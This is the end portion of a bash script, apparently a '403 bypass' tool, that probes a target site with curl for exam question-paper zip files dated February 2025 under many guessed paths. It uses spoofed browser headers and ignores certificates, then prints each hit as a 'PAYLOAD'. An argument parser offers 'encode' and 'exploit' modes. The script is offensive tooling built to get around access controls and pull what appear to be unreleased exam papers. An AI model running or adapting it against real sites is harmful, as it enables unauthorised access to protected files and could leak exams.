echo -n "Payload [Ops_QPHandler/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Ops_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Ops_QPHandler/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AccessControl_QPWorkflow/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AccessControl_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AccessControl_QPWorkflow/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DatabaseManager_QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DatabaseManager_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DatabaseManager_QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch-MonitoringTool/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch-MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch-MonitoringTool/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SuiteExamPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SuiteExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SuiteExamPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessorQPBData/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessorQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessorQPBData/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [SystemQsnPaper/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}SystemQsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}SystemQsnPaper/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QP_AccessControl/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QP_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QP_AccessControl/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps-QPProcessing/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps-QPProcessing/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper_Portal/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper_Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper_Portal/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Service_QPAuto/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Service_QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Service_QPAuto/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow_Management/QP19_02_2025%2001_16_01.zip]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow_Management/QP19_02_2025%2001_16_01.zip" -H "User-Agent: Mozilla/5.0"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print

}
function 403bypass(){ 
	URL_Encode_Bypass
}
function prg(){
	set +u
	while :;do
		case $1 in
			'-u'|'--url')
					target=$2
					path=$(echo $2 | cut -d "/" -f4- )
					domain=$(echo $2 | cut -d "/" -f3)
					shift
					;;
			## modes
			
			'--encode')
				mode='encode'
				;;
      '--exploit')
				mode='exploit'
				;;
			'-h'|'--help')
					usage
					exit 0
					;;
			"")
					shift
					break
					;;
			'*')
				 		 echo "Error: unknown: ${target}"
                         usage
                         exit 127
                         ;;
		esac
		shift
	done

	if [[ -z "${target}" ]];then
        printf "\n[${red}!${end}] ${yellow}No URL/PATH <scheme://domain.tld/path> given. Make sure you go through the usage/help${end}\n\n"
        usage
        exit 127
    fi
	if [[ -z "${mode}" ]];then
        printf "\n[${red}!${end}] ${yellow}No mode given. Make sure you go through the usage/help${end}\n\n"
        usage
        exit 127
    fi

	
	if [ "${mode}" == 'encode' ];then
			echo "encode"
			banner
        	URL_Encode_Bypass
        	exit 0
	elif [ "${mode}" == 'exploit' ];then
			echo "exploit"
        	banner
			403bypass
        	exit 0
	fi
}
prg $@
tput sgr0
